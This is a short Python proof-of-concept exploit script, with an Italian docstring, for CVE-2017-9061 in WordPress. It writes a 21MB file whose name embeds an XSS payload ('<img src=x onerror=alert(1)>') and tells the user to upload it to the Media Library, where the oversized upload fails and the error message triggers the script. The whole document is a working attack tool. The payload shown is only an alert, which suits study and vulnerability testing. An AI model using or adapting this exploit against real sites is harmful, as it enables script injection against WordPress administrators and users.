def create_xss_file():
    """
    Crea un file con nome contenente payload XSS per sfruttare CVE-2017-9061
    """
    filename = "Dinosaurs secret life<img src=x onerror=alert(1)>.png"
    size_mb = 21

    print(f"[*] Creating file: {filename}")
    print(f"[*] Size: {size_mb}MB")

    content = b"A" * (size_mb * 1024 * 1024)

    try:
        with open(filename, "wb") as f:
            f.write(content)
    except Exception:
        print("[-] Error creating file, generating the file on Windows is not supported.")
        raise

    print("[+] File created successfully!")
    print("[*] Upload this file to WordPress Media Library to trigger XSS")


if __name__ == "__main__":
    create_xss_file()
